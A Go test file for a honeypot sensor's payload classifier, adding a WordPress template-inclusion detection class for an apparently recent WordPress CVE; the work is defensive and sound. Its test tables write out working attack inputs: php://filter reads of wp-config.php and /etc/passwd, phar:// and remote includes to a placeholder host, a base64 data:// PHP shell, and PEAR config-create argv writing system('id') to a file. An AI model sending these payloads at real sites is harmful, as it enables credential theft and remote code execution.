package main

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// #3309 / CVE-2026-87902: unauthenticated path traversal and local PHP file
// inclusion in WordPress Core's page-template resolution (KEV 2026-09-25,
// CVSS 9.2, WordPress 4.7.0-7.1.1). CWE-98, CWE-22/23.
//
// This is the second half of #3309. #3359 added
// `wordpress-pagename-traversal` for the traversal half of the chain, on the
// published request shape: an anonymous POST carrying a double-encoded
// `pagename`. That case can only see `../` and `..\` in a parameter named
// `pagename`, which is as much of this CVE as the traversal story describes
// and no more. The mechanism is a file *inclusion* -- get_page_template()
// urldecodes `pagename` and hands the result to locate_template(), which
// checks only that the candidate exists and ends in `.php`/`.html` -- so the
// payload family is wider than traversal: a PHP stream wrapper is the same
// primitive reached a different way, and `template`, `page_template`, `theme`
// and `stylesheet` are the other parameters that name a template on the way
// in.
//
// The design is the one #3364 used for Roundcube and the one #3359 used
// here: a gate on the request's own shape, a payload required on top of it,
// parameters parsed rather than substring-matched, one more branch of the
// existing byte-pattern classifier. Nothing here deserializes anything,
// evaluates anything, or resolves a request-supplied path against the
// filesystem -- url.ParseQuery splits a string into key/value pairs and every
// value is then matched as bytes.
//
// The class is deliberately not a wider `pagename` check. Both halves are
// required, and the WordPress half is the one that was missing: `pagename` is
// a WordPress *query variable*, not a WordPress-exclusive parameter name, and
// relabelling some other application's `../` as a WordPress CVE is the
// failure mode a payload classifier exists to avoid. So: a template selector
// plus a second, WordPress-owned signal, plus an inclusion payload.
//
// Not measured against the fleet's corpus. The 30-day window #3309 measured
// contains no request of this CVE's shape, and Elasticsearch is not reachable
// from where this landed, so the coverage this class adds is unmeasured and
// the cases below follow the published shape instead: the advisory
// (GHSA-7hp8-65ch-5whp), the Equixly write-up, and the verified public PoC
// at github.com/ressl/cve-2026-87902-poc. What the tests pin is the boundary
// that decides whether the class is usable, and every expected value in the
// negative tables is the value origin/main already produced for that input --
// measured, not assumed.

const wpTemplateInclusion = "wordpress-template-inclusion"

// TestWordpressTemplateInclusion covers what #3359's case structurally
// cannot: an inclusion payload that is not a `../` in a parameter named
// `pagename`.
func TestWordpressTemplateInclusion(t *testing.T) {
	cases := []struct {
		name, query, body string
		want              string
	}{
		// --- the remote-include half of the payload family. The same
		// urldecode() call in get_page_template() that activates `../`
		// activates a stream wrapper, and issue #3309 proposed names
		// `phar://` and `data://text/plain` as the wrappers to look for
		// alongside `pearcmd`.

		{
			name: "php://filter read through pagename, with the documented page_id",
			body: "page_id=2&pagename=php://filter/convert.base64-encode/resource=wp-config.php",
			want: wpTemplateInclusion,
		},
		{
			name: "phar:// deserialization wrapper through pagename",
			body: "page_id=2&pagename=phar://203.0.113.9/uploads/2026/09/x.phar/index",
			want: wpTemplateInclusion,
		},
		{
			name:  "data://text/plain through pagename",
			query: "page_id=2&pagename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOw==",
			want:  wpTemplateInclusion,
		},
		{
			name:  "remote include straight to an attacker URL",
			query: "page_id=2&pagename=https://203.0.113.9/stage2.php",
			want:  wpTemplateInclusion,
		},
		{
			// ...and the target it names is a credential file, so #3359's
			// precedence rule decides this one: "the mechanism wins over the
			// target, because they can read it is the more actionable half
			// and the raw query still names the file". An inclusion aimed at
			// /etc/passwd is a narrower, more useful reading than "somebody
			// asked for /etc/passwd".
			name: "wrapper naming a credential file outranks the generic secret-read class",
			body: "page_id=2&pagename=php://filter/convert.base64-encode/resource=/etc/passwd",
			want: wpTemplateInclusion,
		},

		// --- the other parameters that name a template. Issue #3309 asked
		// for "template/theme query parameters carrying traversal", and
		// page_template/template are the ones WordPress resolves through
		// the same hierarchy. #3359's case is blind to all of them: it
		// matches the parameter name `pagename` exactly.

		{
			name: "page_template carrying traversal, the documented page_id",
			body: "page_id=2&page_template=../../../../../../wp-config.php",
			want: wpTemplateInclusion,
		},
		{
			name:  "backslash traversal in page_template, which no existing case reads",
			query: "page_id=2&page_template=..%5c..%5c..%5c..%5c..%5cboot.ini",
			want:  wpTemplateInclusion,
		},
		{
			// A scanner that has read the advisory pre-encodes the wrapper,
			// because the CVE works precisely because WordPress decodes the
			// candidate a second time. Three rounds, the same budget
			// wordpressPagenameTraversal allows, so an extra encoding layer
			// cannot hide it. It has to be a selector other than `pagename`
			// to reach this class at all, and that is not an accident: for
			// `pagename` the older class already claims the double-encoded
			// form, because the surviving `%2f` is the very thing it looks
			// for.
			name:  "double-encoded wrapper, decoded twice before it reads as one",
			query: "page_id=2&template=%2570%2568%2570%253a%252f%252ffilter%252fconvert.base64-encode%252fresource%253dwp-config.php",
			want:  wpTemplateInclusion,
		},
		{
			name:  "template carrying traversal on a WordPress REST route",
			query: "rest_route=/wp/v2/pages&template=../../../../../../etc/passwd",
			want:  wpTemplateInclusion,
		},
		{
			name:  "theme carrying traversal on a WordPress REST route",
			query: "rest_route=/wp/v2/pages&page_id=2&theme=../../../../../../etc/passwd",
			want:  wpTemplateInclusion,
		},
		{
			// The same target reached through a value that names a WordPress
			// core path, which is the shape issue #3309's first proposal
			// described (a theme path walking out of itself). It arrives
			// here as a parameter value, not as a URL path, because that is
			// where a POST body carries it.
			name:  "stylesheet naming a theme path that walks out of itself",
			query: "page_id=2&stylesheet=../../../../../../wp-content/plugins/akismet/akismet.php",
			want:  wpTemplateInclusion,
		},

		// --- the PEAR stage, which is the issue's third proposal. The
		// verified PoC splits one request across two places: WordPress's
		// routing in the form body, PEAR's argv in the raw query string
		// (PHP splits the query on literal `+` and does not decode the
		// arguments). The existing pearcmd-rce case reads the query only
		// and needs both markers in it, so the shape the advisory tells
		// defenders to look for -- "query strings containing PEAR command
		// syntax such as +config-create+ ... on requests to the WordPress
		// front end" -- falls between two cases and is labelled nothing.

		{
			name:  "WordPress front end carrying PEAR argv in the query",
			query: "+config-create+/<?=system('id')?>+/tmp/x.php",
			body:  "page_id=2&template=../../../../../../usr/local/lib/php/pearcmd",
			want:  wpTemplateInclusion,
		},
		{
			// Same bytes, and the only difference is the WordPress routing
			// beside them. This is the pair that decides the class: neither
			// half is this CVE on its own.
			name:  "pearcmd named in the query, WordPress routing in the body",
			query: "pearcmd&+config-create+/&/<?=system('id')?>+/tmp/x.php",
			body:  "page_id=2&page_template=../../../../../../usr/local/lib/php/pearcmd",
			want:  wpTemplateInclusion,
		},
		{
			// The PEAR writer re-probed at a WordPress front end once the
			// traversal has already been staged elsewhere, so there is no
			// inclusion payload in this request at all -- only the argv
			// channel and WordPress's own routing. Worth its own branch
			// because it is the request the advisory names and nothing else
			// in the classifier sees it.
			name:  "PEAR writer probe at a WordPress front end, nothing else",
			query: "+config-create+/&/<?=system('id')?>+/tmp/x.php",
			body:  "page_id=2&pagename=about-us",
			want:  wpTemplateInclusion,
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := classifyPayload(c.query, c.body); got != c.want {
				t.Errorf("classifyPayload(%q, %q) = %q, want %q", c.query, c.body, got, c.want)
			}
		})
	}
}

// TestWordpressTemplateInclusionLeavesBenignTrafficAlone is the half the
// classifier's own rule demands: a pattern that fires on ordinary traffic is
// worse than no pattern, because it makes every event look interesting. Each
// case here is traffic that is either genuinely ordinary or one step away
// from an attack, and each is close enough to the gate to be worth pinning.
//
// Every `want` is the value origin/main already produced for that input, so
// this table also pins that nothing else moved.
func TestWordpressTemplateInclusionLeavesBenignTrafficAlone(t *testing.T) {
	cases := []struct {
		name, query, body string
		want              string
	}{
		{
			// The most obvious mistake available: a `..` is not a traversal
			// until a separator follows it. This is a page slug with a
			// double dot in it, and it carries the full WordPress shape.
			name:  "a double dot with no separator after it is a slug",
			query: "page_id=2&pagename=my..slug",
			want:  "",
		},
		{
			// The whole WordPress shape -- selector, routing parameter and
			// core path -- with an ordinary value in every one of them. If
			// the gate ever stops requiring a payload, every page view on a
			// WordPress front end becomes this class.
			name:  "the WordPress shape alone, fetching an ordinary page",
			query: "page_id=2&theme=twentytwentyfive&file=/wp-content/themes/twentytwentyfive/style.css",
			want:  "",
		},
		{
			// `redirect_to=/wp-admin/` puts a WordPress marker in the
			// request, and the shape is not the point: the point is that
			// the marker alone is not enough, and neither is a parameter
			// name that looks template-shaped.
			name: "an ordinary WordPress login",
			body: "log=admin&pwd=Summer2026&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
			want: "",
		},
		{
			// A normal plugin request: the plugin is named, the file is
			// read, nothing is traversed and nothing is included. `action`
			// and `plugin` are not treated as WordPress evidence here --
			// `action` is a Joomla/Drupal parameter too, and the honest
			// list of WordPress-owned signals is the routing and core-path
			// ones.
			name:  "a normal plugin readme request",
			query: "action=plugin&plugin=akismet&version=5.3&file=readme.txt",
			want:  "",
		},
		{
			// A real class that must keep its label: 372 events in the
			// window #3309 measured. Enumerating the REST surface is not
			// this CVE, and relabelling it would lose a filter analysts
			// already use.
			name:  "a normal WordPress REST enumeration",
			query: "rest_route=/wp/v2/users&per_page=100",
			want:  "wordpress-rest-probe",
		},
		{
			// A remote URL is only a remote *include* in a parameter that
			// names a template. Everywhere else it is a link, and this
			// request is an ordinary page fetch carrying one.
			name:  "a remote URL beside the shape, in a parameter that names no template",
			query: "page_id=2&pagename=about-us&redirect_to=https://example.com/",
			want:  "",
		},
		{
			// The "a path containing .. that is not an inclusion attempt"
			// case: a rewritten asset URL walking up and back down. Nobody
			// includes that, and the sensor has no business calling it one.
			name:  "a relative path that walks up and back down",
			query: "next=/themes/../uploads/photo.jpg&w=800",
			want:  "",
		},
		{
			// The same, next to a WordPress path, which makes it the harder
			// version of the same near-miss.
			name:  "a relative path that walks out of a WordPress directory",
			query: "next=/wp-admin/../wp-login.php",
			want:  "",
		},
		{
			// A documentation question, on a pager. The `wp-content/` here
			// is prose; it is a shape marker only when it appears in the
			// same request as a template selector, and even then it is not
			// a payload.
			name:  "wp-content in a prose value, with no selector",
			query: "q=how+to+install+wp-content+themes+on+debian&page=2",
			want:  "",
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := classifyPayload(c.query, c.body); got != c.want {
				t.Errorf("classifyPayload(%q, %q) = %q, want %q (benign traffic must not become this CVE)", c.query, c.body, got, c.want)
			}
		})
	}
}

// TestWordpressTemplateInclusionLeavesForeignClassesAlone is the other half
// of "require the WordPress shape AND an inclusion payload". A generic LFI
// or RFI aimed at some other application keeps the class it already had --
// relabelling it as a WordPress CVE would be wrong in the field, and would
// also lose the generic signal analysts filter on.
//
// The first four are real traffic from the window #3309 measured, with the
// counts it reported.
func TestWordpressTemplateInclusionLeavesForeignClassesAlone(t *testing.T) {
	cases := []struct {
		name, query, body string
		want              string
	}{
		{
			// 25 events: the PEAR LFI against index.php. Both markers, in
			// the query, and no WordPress shape -- so pearcmd-rce keeps it.
			name:  "real: index.php pearcmd LFI",
			query: "+config-create+/&lang=../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+/tmp/x.php",
			want:  "pearcmd-rce",
		},
		{
			// The same argv with no WordPress routing beside it. This is the
			// negative twin of the "pearcmd named in the query" positive
			// above: same query string, one body changed, opposite answer.
			name:  "pearcmd argv with no WordPress shape",
			query: "pearcmd&+config-create+/&/<?=system('id')?>+/tmp/x.php",
			want:  "pearcmd-rce",
		},
		{
			// 81 events: traversal with no escalation.
			name:  "real: bare traversal",
			query: "lang=../../../../../../../../tmp/index1",
			want:  "path-traversal",
		},
		{
			// 14 events: the theme css.php file disclosure. It names a
			// WordPress file and is still not this CVE -- it reaches
			// wp-config.php through a plugin's own `files` parameter, so no
			// template resolution is involved at all.
			name:  "real: theme css.php file disclosure keeps the generic class",
			query: "files=../../../../wp-config.php",
			want:  "path-traversal",
		},
		{
			// The hard one, and the reason the gate needs a second
			// WordPress signal rather than just a template-shaped parameter
			// name: `template` is a WordPress query variable, and it is also
			// a perfectly ordinary parameter name elsewhere. A generic LFI
			// through one keeps its own class.
			name:  "generic traversal in a template-named parameter",
			query: "template=../../../../../../etc/passwd",
			want:  "secret-read",
		},
		{
			// A generic RFI. The wrapper is the same bytes this CVE uses,
			// aimed at something that is not WordPress, and it keeps the
			// generic credential-read class rather than being relabelled.
			name:  "generic php://filter read with no WordPress shape",
			query: "file=php://filter/convert.base64-encode/resource=/etc/passwd",
			want:  "secret-read",
		},
		{
			// ...and the same wrapper aimed at a file that is not a
			// credential, which nothing in the corpus labels today. It stays
			// unlabelled: this change adds a WordPress inclusion class, not
			// a generic one.
			name:  "generic remote include with no WordPress shape stays unlabelled",
			query: "include=https://203.0.113.9/stage2.php",
			want:  "",
		},
		{
			// A wrapper in a parameter that names no template, with no
			// WordPress shape.
			name:  "generic phar:// with no WordPress shape and no selector",
			query: "file=phar://203.0.113.9/uploads/x.phar/index",
			want:  "",
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := classifyPayload(c.query, c.body); got != c.want {
				t.Errorf("classifyPayload(%q, %q) = %q, want %q (this class must not take traffic that belongs to another one)", c.query, c.body, got, c.want)
			}
		})
	}
}

// TestWordpressTemplateInclusionReachesTheEvent is the half a unit test
// cannot cover: that the class actually lands on the emitted event, on a
// request where the decoy made no authentication decision.
//
// CVE-2026-87902 is pre-authentication by construction -- the PoC sends no
// cookie and no authorization header, and the advisory requires no account,
// session, plugin or outbound request. This sensor keeps no session and
// consults no backend, so "unauthenticated" here is a statement about the
// request and the response rather than about a session the decoy never had:
// auth_outcome is "unknown" -- nothing in serve() decided anything about an
// identity -- while the payload is still classified. The class must not
// require a login to have happened first.
func TestWordpressTemplateInclusionReachesTheEvent(t *testing.T) {
	s, output := newTestServer()

	// The wrapper half of the published shape, sent the way a browser would
	// send it and with the Content-Type a browser sends, so this exercises
	// the form redaction path rather than the opaque one.
	const body = "page_id=2&pagename=php://filter/convert.base64-encode/resource=/etc/passwd"

	r := httptest.NewRequest(http.MethodPost, "http://example/", strings.NewReader(body))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	r.RemoteAddr = "203.0.113.7:54321"
	w := httptest.NewRecorder()
	s.ServeHTTP(w, r)

	line := output.String()
	if !strings.Contains(line, `"payload_class":"wordpress-template-inclusion"`) {
		t.Fatalf("the event did not carry the payload class: %s", line)
	}
	// #3213's rule is that redaction must not cost the fleet a payload
	// signature. This body is a form, so the redaction pass ran over it:
	// pagename is neither a credential field nor session material, so the
	// inclusion payload has to survive for an analyst to read it out of the
	// event.
	if !strings.Contains(line, "php://filter") {
		t.Fatalf("the inclusion payload was scrubbed out of the stored body: %s", line)
	}
	// No authentication decision was made for this request, which is the
	// pre-auth half of the CVE.
	if !strings.Contains(line, `"auth_outcome":"unknown"`) {
		t.Fatalf("expected no authentication decision for this request: %s", line)
	}
	// Nothing was resolved. The decoy answers from its own modelled
	// surface, so a request naming a local file gets a decoy response and
	// an event carrying the request bytes -- never the contents of a file
	// the request asked for, and never a traversal outside the container.
	if w.Code != http.StatusOK {
		t.Fatalf("expected the decoy to answer the request itself, got %d: %s", w.Code, line)
	}
}
